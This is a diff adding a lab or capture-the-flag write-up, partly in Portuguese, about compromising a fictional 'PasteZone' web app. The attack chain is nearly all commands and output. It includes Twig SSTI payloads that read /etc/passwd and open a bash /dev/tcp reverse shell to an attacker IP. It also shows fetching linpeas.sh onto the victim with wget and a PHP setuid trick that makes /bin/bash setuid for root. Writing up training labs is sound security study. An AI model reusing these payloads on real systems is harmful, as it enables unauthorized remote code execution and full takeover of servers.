@@ -1,0 +1,93 @@
+#+title: Paste Zone lab
+#+author: gabriel
+#+description: easy lab
+
+* lab
+An urgent midnight intelligence alert has triggered a full-scale response: sensitive data belonging to the Ministry of Energy has been discovered for sale on PasteZone, one of the most notorious illegal platforms on the dark web. Cybercriminals use this site to anonymously share details of compromised systems, vulnerabilities, and stolen data. Preliminary investigations have confirmed that the leaked content originates directly from the Ministry of Energy’s systems, posing a significant security threat.
+
+Your mission is to identify the individuals or groups responsible for this breach, gather intelligence on PasteZone’s administrators, and collect actionable evidence.
+
+* enum com feroxbuster
+#+begin_src sh
+feroxbuster --url http://pastezone.hv > t.txt
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://pastezone.hv
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+#+end_src
+
+A enumeração demonstrou alguns arquivos e directorys interessantes ->
+#+begin_src sh
+200      GET        6l      148w    89220c http://pastezone.hv/assets/css/all.min.css
+200      GET        9l       53w      602c http://pastezone.hv/assets/images/favicon.svg
+200      GET      593l     1345w    11706c http://pastezone.hv/assets/css/style.css
+200      GET      538l     1225w    28939c http://pastezone.hv/
+301      GET        9l       28w      313c http://pastezone.hv/vendor => http://pastezone.hv/vendor/
+[#>------------------] - 19s    20686/210029  4m      found:10      errors:251    
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_pastezone_hv-1759423707.state ...
+[#>------------------] - 19s    20884/210029  4m      found:10      errors:251    
+[##>-----------------] - 19s     3820/30000   204/s   http://pastezone.hv/ 
+[#>------------------] - 14s     2410/30000   172/s   http://pastezone.hv/assets/ 
+[#######>------------] - 14s    11416/30000   818/s   http://pastezone.hv/database/ 
+[>-------------------] - 14s     1334/30000   97/s    http://pastezone.hv/assets/images/ 
+[>-------------------] - 14s      215/30000   16/s    http://pastezone.hv/assets/js/ 
+[>-------------------] - 14s     1329/30000   96/s    http://pastezone.hv/assets/css/ 
+[>-------------------] - 5s       287/30000   57/s    http://pastezone.hv/vendor/
+#+end_src
+
+Principal find ->
+: http://pastezone.hv/create.php
+
+Esta página é vulnerável a SSTI (Server SIde template injeciton )na criação do post, pois a aplicação utiliza o template TWig do PHP
+
+Payload de teste simples ->
+#+begin_src sh
+{{ 7 * 7  }}
+#+end_src
+
+A página retorna ~49~, o processamento matemático foi realizdo com sucesso.
+
+Payload mais avançado após identificar a presença de um filtro no input, porém com este payload arquivos sensives podem ser acessados ->
+: {{['cat\x20/etc/passwd']|filter('system')}}
+
+*Reverse shell payload* ->
+: {{['bash -c "bash -i >& /dev/tcp/172.20.69.80/4444 0>&1"']|filter('system')}}
+
+*Pegar o linpeas.sh para a maquina comprometida* ->
+Serve the linpeas.sh
+#+begin_src sh
+┌─[root@hackerbox]─[~/Desktop/misc/LinuxPrivilegeEscalation]
+└──╼ #python3 -m http.server 7777
+Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
+172.20.69.73 - - [02/Oct/2025 12:13:47] "GET /linpeas.sh HTTP/1.1" 200 -
+#+end_src
+
+at /tmp dir, get from compromised machine ->
+: wget http://172.20.20.20:7777/linpeas.sh
+
+: chmod +x linpeas.sh
+
+*after run the linpeas* ->
+: /usr/bin/php8.4 -r "posix_setuid(0); system('chmod +s /bin/bash');"
+
+#+begin_src sh
+<r "posix_setuid(0); system('chmod +s /bin/bash');"
+www-data@debian:/tmp$ /bin/bash -p
+/bin/bash -p
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+#+end_src
